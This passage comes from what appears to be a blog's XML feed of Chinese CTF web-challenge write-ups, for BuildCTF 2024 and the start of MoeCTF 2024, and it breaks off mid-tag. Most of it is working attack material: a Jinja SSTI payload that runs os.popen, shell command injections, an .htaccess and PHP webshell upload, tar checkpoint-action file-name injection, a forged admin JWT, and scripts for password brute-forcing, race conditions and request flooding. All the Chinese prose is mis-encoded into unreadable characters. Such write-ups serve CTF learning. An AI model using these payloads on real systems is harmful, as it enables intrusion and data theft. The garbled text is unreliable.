class="line">&#123;&#123;request[&quot;_&quot;+&#x27;_ini&#x27;+&#x27;t_&#x27;+&#x27;_&#x27;][&#x27;_&#x27;+&quot;_global&quot;+&quot;s_&quot;+&quot;_&quot;][&quot;_&quot;+&quot;_built&quot;+&quot;ins_&quot;+&quot;_&quot;][&quot;eval&quot;](&quot;_&quot;+&quot;_import_&quot;+&quot;_(&#x27;o&quot;+&quot;s&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä»–çš„payloadè‡ªç”±å‘æŒ¥ï¼ŒåŸºæœ¬æ ¹æ®é»‘åå•çš„ä¸åŒè€Œå˜åŒ–</p><p><strong>é»‘åå•ç»•è¿‡</strong> </p><p>ç®€å•æ¥è¯´å°±æ˜¯ç”¨ç­‰ä»·å½¢å¼ä»£æ›¿</p><p><a href="https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/">https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>]]></content>
    
    
    <categories>
      
      <category>æŠ€æœ¯</category>
      
      <category>ctf</category>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024buildCTF-web-wp</title>
    <link href="/2024/10/10/2024buildCTF/"/>
    <url>/2024/10/10/2024buildCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="2024buildCTF-web-wp"><a href="#2024buildCTF-web-wp" class="headerlink" title="2024buildCTF -web-wp"></a>2024buildCTF -web-wp</h1><h2 id="æˆ‘å†™çš„ç½‘ç«™è¢«rceäº†ï¼Ÿ"><a href="#æˆ‘å†™çš„ç½‘ç«™è¢«rceäº†ï¼Ÿ" class="headerlink" title="æˆ‘å†™çš„ç½‘ç«™è¢«rceäº†ï¼Ÿ"></a>æˆ‘å†™çš„ç½‘ç«™è¢«rceäº†ï¼Ÿ</h2><p><code>log_type=||nl$&#123;IFS&#125;/fl&#39;&#39;ag||</code></p><h2 id="ez-http"><a href="#ez-http" class="headerlink" title="ez!http"></a>ez!http</h2><p>è·Ÿç€æŒ‰è¦æ±‚æ“ä½œï¼Œç”¨httpå¤´ä¼ªé€ </p><h2 id="find-the-id"><a href="#find-the-id" class="headerlink" title="find-the-id"></a>find-the-id</h2><p>ä¼ idçˆ†ç ´å°±è¡Œ</p><h2 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h2><p>å¯ä¸Šä¼ .htaccess       <code>AddType application/x-httpd-php .png</code></p><p>ä¸Šä¼ 2.png   GIF89a<?=`en''v`?></p><p>è®¿é—®2.png</p><h2 id="RedFlag"><a href="#RedFlag" class="headerlink" title="RedFlag"></a>RedFlag</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br></code></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/articles/web/305268.html">https://www.freebuf.com/articles/web/305268.html</a></p><h2 id="tflock"><a href="#tflock" class="headerlink" title="tflock"></a>tflock</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br>route = <span class="hljs-string">&quot;/login.php&quot;</span><br><span class="hljs-comment"># url2 = &quot;http://27.25.151.80:38515/admin.php&quot;</span><br>url = <span class="hljs-string">&#x27;http://27.25.151.80:8000/api/game/2/container/10&#x27;</span><br>proxy = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>,<br>    <span class="hljs-string">&quot;https&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>,<br>&#125;<br>cookie = &#123;<span class="hljs-string">&#x27;GZCTF_Token&#x27;</span>:<span class="hljs-string">&#x27;xxxxxxx&#x27;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">des</span>():<br>    response = requests.delete(url, cookies=cookie)<br>    <span class="hljs-comment"># print(response.text)</span><br>    <span class="hljs-comment"># if response.status_code == 429:</span><br>    <span class="hljs-comment">#     print(&quot;ç­‰å¾…10ç§’&quot;)</span><br>    <span class="hljs-comment">#     time.sleep(10)</span><br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">else</span>:<br>        des()<br>i = <span class="hljs-number">0</span><br><span class="hljs-comment">#è½½å…¥å­—å…¸</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;password.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    dictionary = f.readlines()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    response = requests.post(url,cookies=cookie)<br><br>    <span class="hljs-comment"># print(response.text)</span><br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>        response = response.json()<br>        route=<span class="hljs-string">&#x27;http://&#x27;</span>+response[<span class="hljs-string">&quot;entry&quot;</span>]+<span class="hljs-string">&quot;/login.php&quot;</span><br>        <span class="hljs-comment"># print(route)</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>            i+=<span class="hljs-number">1</span><br>            <span class="hljs-comment"># print(dictionary[i-1].strip())</span><br>            data = &#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: dictionary[i-<span class="hljs-number">1</span>].strip()&#125;<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ¬¡æ•°ï¼š&quot;</span>+<span class="hljs-built_in">str</span>(i))<br>            r = requests.post(route, data=data).json()<br>            <span class="hljs-built_in">print</span>(r)<br>            <span class="hljs-keyword">if</span> r[<span class="hljs-string">&quot;success&quot;</span>] == <span class="hljs-literal">True</span>:<br>                <span class="hljs-built_in">print</span>(dictionary[i].strip())<br>                <span class="hljs-built_in">print</span>(r)<br>                <span class="hljs-keyword">break</span><br>        des()<br>    <span class="hljs-keyword">elif</span> response.status_code == <span class="hljs-number">400</span>:<br>        des()<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># print(&quot;ç­‰å¾…1&quot;)</span><br>        <span class="hljs-comment"># time.sleep(10)</span><br>        <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>adminå¯†ç ti1oLz@OhU</p><p>flag:${jnDl:rMi:&#x2F;&#x2F;ZPs27nNU9vjg7d6zgFh2EsHvYM435ATt.OA5ti1Y.COM}</p><p>è¿™æ ¼å¼æ— æ•Œäº†</p><h2 id="ez-md5"><a href="#ez-md5" class="headerlink" title="ez_md5"></a>ez_md5</h2><p>level1</p><p><code>ffifdyop</code></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105848249">https://blog.csdn.net/qq_45521281/article/details/105848249</a></p><p>md5:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">content: ffifdyop<br>hex: 276f722736c95d99e921722cf9ed621c<br>raw: &#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c<br>string: &#x27;or&#x27;6]!r,b<br></code></pre></td></tr></table></figure><p>level2</p><p>a&#x3D;2653531602&amp;b&#x3D;2427435592</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;114514&#x27;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;xxxxxxx&#x27;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">1000000</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">10000000</span>;<span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$i</span>;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> === <span class="hljs-string">&#x27;3e41f780146b6c246cd49dd296a3da28&#x27;</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;ok&#x27;</span> . <span class="hljs-variable">$b</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Build[CTF.com&#x3D;1145146803531</p><p><a href="https://www.cnblogs.com/meng-han/p/16804708.html">https://www.cnblogs.com/meng-han/p/16804708.html</a></p><h2 id="Why-so-serials"><a href="#Why-so-serials" class="headerlink" title="Why_so_serials?"></a>Why_so_serials?</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Gotham</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Bruce</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Wayne</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$crime</span>=<span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$Bruce</span>,<span class="hljs-variable">$Wayne</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;Bruce = <span class="hljs-variable">$Bruce</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;Wayne = <span class="hljs-variable">$Wayne</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-string">&#x27;&quot;;s:5:&quot;crime&quot;;b:1;&#125;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;joker&#x27;</span>,<span class="hljs-number">19</span>);<br><br><span class="hljs-variable">$city</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Gotham</span>(<span class="hljs-string">&quot;Batman&quot;</span>,<span class="hljs-string">&#x27;joker&quot;;s:5:&quot;crime&quot;;b:1;&#125;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$city</span>);<br></code></pre></td></tr></table></figure><p>jokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerâ€;s:5:â€crimeâ€;b:1;}</p><h2 id="sub"><a href="#sub" class="headerlink" title="sub"></a>sub</h2><p>æ³¨å†Œç™»å½•æ‹¿jwt, æ”¹roleä¸ºadmin, ç”¨ç§˜é’¥BuildCTFåŠ å¯†å¾—eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ4dCIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcyOTMyMjc1NH0.5OMCHZdCC4zXZeeBdlI7iZxzh_CUxx1f8U3FDqi4kRs</p><p>file&#x3D;test2.txt;env</p><h2 id="eazyl0gin"><a href="#eazyl0gin" class="headerlink" title="eazyl0gin"></a>eazyl0gin</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">username</span>: <span class="hljs-string">&quot;buÄ±ldCTF&quot;</span><br><span class="hljs-attr">password</span>: <span class="hljs-string">&quot;012346&quot;</span><br></code></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p><h2 id="Cookie-Factory"><a href="#Cookie-Factory" class="headerlink" title="Cookie_Factory"></a>Cookie_Factory</h2><p>ctrl+shift+iæ‰“å¼€å¼€å‘è€…å·¥å…·</p><p>socket.on(â€˜errorâ€™å¤„ä¸‹æ–­ç‚¹ f5åˆ·æ–°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">socket.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-string">&quot;power&quot;</span>: <span class="hljs-number">1000000000000000000000000000000000000000000000000000000000000000000000</span>, <span class="hljs-string">&quot;value&quot;</span>: send.<span class="hljs-property">value</span> &#125;));socket.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">msg</span>) &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Error&quot;</span>)   &#125;);socket.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;recievedScore&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">msg</span>) &#123;    <span class="hljs-keyword">let</span> scores = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(msg)    send.<span class="hljs-property">value</span> = scores.<span class="hljs-property">value</span>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(scores.<span class="hljs-property">value</span>) &#125;);<br></code></pre></td></tr></table></figure><p>è¿è¡Œ</p><h2 id="åˆ®åˆ®ä¹"><a href="#åˆ®åˆ®ä¹" class="headerlink" title="åˆ®åˆ®ä¹"></a>åˆ®åˆ®ä¹</h2><p>httpå¤´åŠ  referer:baidu.com</p><p>cmd&#x3D;cat &#x2F;f*&gt;&gt;4</p><p>curlè®¿é—®è·¯å¾„4</p><h2 id="fake-signin"><a href="#fake-signin" class="headerlink" title="fake_signin"></a>fake_signin</h2><p><img src="/2024/10/10/2024buildCTF/2.png" alt="img"></p><p>flaské»˜è®¤å¼€å¯å¤šçº¿ç¨‹ï¼ˆthreadedé»˜è®¤Trueï¼‰ï¼Œè€Œusersæ˜¯å…¨å±€å˜é‡ï¼Œå¤šçº¿ç¨‹å¹¶è¿›ï¼Œæ¯ä¸ªéƒ½ä¼šè®¿é—®ä¿®æ”¹usersï¼Œåœ¨supplement_count+&#x3D;1è¿˜æœªè¿”å›æ—¶ï¼Œå¼€å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶ç­¾åˆ°</p><p>æ¡ä»¶ç«äº‰ï¼Œä¸€æ¬¡ç›´æ¥ç­¾30ä¸ª</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> *<br><br>url = <span class="hljs-string">&quot;http://27.25.151.80:43427&quot;</span><br><br><span class="hljs-keyword">import</span> requests<br>req = requests.session()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    req.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/login&quot;</span>, data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&quot;admin&quot;</span>&#125;)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">date</span>):<br>    rsp = req.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/supplement_signin&quot;</span>, data= &#123;<span class="hljs-string">&quot;supplement_date&quot;</span>: date&#125;)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;BuildCTF&#123;&#x27;</span> <span class="hljs-keyword">in</span> rsp.content:<br>        c = rsp.content<br>        f1 = c.find(<span class="hljs-string">b&#x27;BuildCTF&#123;&#x27;</span>)<br>        f2 = c.find(<span class="hljs-string">b&#x27;&#125;&#x27;</span>, f1)<br>        <span class="hljs-built_in">print</span>(c[f1:f2 + <span class="hljs-number">1</span>])<br>        exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payloads = [<span class="hljs-string">f&#x27;2024-09-<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(i).zfill(<span class="hljs-number">2</span>)&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">31</span>)]<br>    login()<br>    thr = ThreadPoolExecutor(<span class="hljs-number">30</span>)<br>    thr.<span class="hljs-built_in">map</span>(attack, payloads)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string">b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;b&#x27;BuildCTF&#123;5d5a77cc-0406-40d9-9087-bb3953ec7f8c&#125;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="æ‰“åŒ…ç»™ä½ "><a href="#æ‰“åŒ…ç»™ä½ " class="headerlink" title="æ‰“åŒ…ç»™ä½ "></a>æ‰“åŒ…ç»™ä½ </h2><p><img src="/2024/10/10/2024buildCTF/1.png" alt="L6YtvZPBS52bxac"></p><p>*è¡¨ç¤ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰ééšè—æ–‡ä»¶æ–‡ä»¶åç»„åˆ    </p><p>ä¸Šä¼ æ–‡ä»¶å</p><ol><li>â€“checkpoint&#x3D;1</li><li>â€“checkpoint-action&#x3D;exec&#x3D;$(echo Y2F0IC9HdWVzc19teV9uYW1l|base64 -d)&gt;1</li><li>2.txt(ä»»æ„æ–‡ä»¶)</li></ol><p>ä¸‹è½½ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡ç›¸å½“äºæŠŠæ–‡ä»¶åæ‹¼åˆ°*çš„åœ°æ–¹ï¼Œæ‰§è¡Œå‘½ä»¤$(echo Y2F0IC9HdWVzc19teV9uYW1l|base64 -d)&gt;1å°†flagå†…å®¹å†™å…¥æ–‡ä»¶1</p><p>ç¬¬äºŒæ¬¡å°†1æ‰“åŒ…å‘é€ç»™æˆ‘ä»¬</p><h2 id="ez-waf"><a href="#ez-waf" class="headerlink" title="ez_waf"></a>ez_waf</h2><p>\x0000000000000000æˆªæ–­</p><p>æ‰¾ä¸€ä¸ªæ–‡ä»¶å°¾æœ‰å¾ˆå¤š\x00000çš„æ–‡ä»¶</p><p>bpæŠ“åŒ…æ–‡ä»¶å°¾æ·»åŠ &lt;?php system(env);   ä¸Šä¼ æˆåŠŸ</p>]]></content>
    
    
    <categories>
      
      <category>æŠ€æœ¯</category>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>moectf2024-Web-wp</title>
    <link href="/2024/10/10/moectf2024-Web-wp/"/>
    <url>/2024/10/10/moectf2024-Web-wp/</url>
    
    <content type="html"><![CDATA[<h2 id="webå…¥é—¨æŒ‡åŒ—"><a href="#webå…¥é—¨æŒ‡åŒ—" class="headerlink" title="webå…¥é—¨æŒ‡åŒ—"></a>webå…¥é—¨æŒ‡åŒ—</h2><p>phpstudyå‚»ç“œå¼å®‰è£…å³å¯ï¼Œé¼“åŠ±å¤§å®¶è‡ªè¡Œæ­å»ºï¼Œç„¶åé™„ä»¶æºç æ”¾ç½‘ç«™æ ¹ç›®å½•ï¼ˆphpstudyé»˜è®¤ä¸€èˆ¬æ˜¯WWWï¼‰ï¼Œæ³¨æ„åˆ é™¤æ ¹ç›®å½•ä¸‹çš„index.php, è¦†ç›–index.html, å› ä¸ºé»˜è®¤é…ç½®è®¿é—®æ ¹ç›®å½•ï¼ˆGET &#x2F;ï¼‰index.phpçš„ä¼˜å…ˆçº§æ¯”index.htmlé«˜ï¼Œæµè§ˆå™¨è¾“å…¥æ­£ç¡®urlè®¿é—®å³å¯å›æ˜¾flag</p><h2 id="ez-http"><a href="#ez-http" class="headerlink" title="ez_http"></a>ez_http</h2><p>æŒ‰è¦æ±‚åšï¼Œåšä¸‹ä¸€æ­¥æ—¶ä¸è¦ä¸¢å¼ƒä¸Šä¸€æ­¥çš„æ“ä½œ</p><p><img src="/2024/10/10/moectf2024-Web-wp/img1.png"></p><h2 id="ProveYourLove"><a href="#ProveYourLove" class="headerlink" title="ProveYourLove"></a>ProveYourLove</h2><p>å‰ç«¯é˜»æ­¢é‡å¤æäº¤ï¼Œå‘åŒ…ç»•è¿‡, expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//exp.py</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:53785/questionnaire&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;nickname&#x27;</span>: <span class="string">&#x27;xiaotian&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;target&#x27;</span>: <span class="string">&#x27;333&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;eeeeeeeeee&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user_gender&#x27;</span>: <span class="string">&#x27;male&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;target_gender&#x27;</span>: <span class="string">&#x27;male&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;anonymous&#x27;</span>: <span class="string">&#x27;false&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">    response = requests.post(url, json=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Status Code:&#x27;</span>, response.status_code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Response JSON:&#x27;</span>, response.json())</span><br></pre></td></tr></table></figure><p>ç”µé™¢_Backend</p><p>åå°å¸¸ç”¨robotsåè®®é˜²æ­¢çˆ¬è™«çˆ¬å–ï¼Œè®¿é—®robots.txtå‘ç°å­˜åœ¨&#x2F;admin&#x2F;, </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /admin/</span><br></pre></td></tr></table></figure><p>è®¿é—®&#x2F;admin&#x2F;å‘ç°åå°ï¼Œé™„ä»¶ç»™äº†login.phpæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span 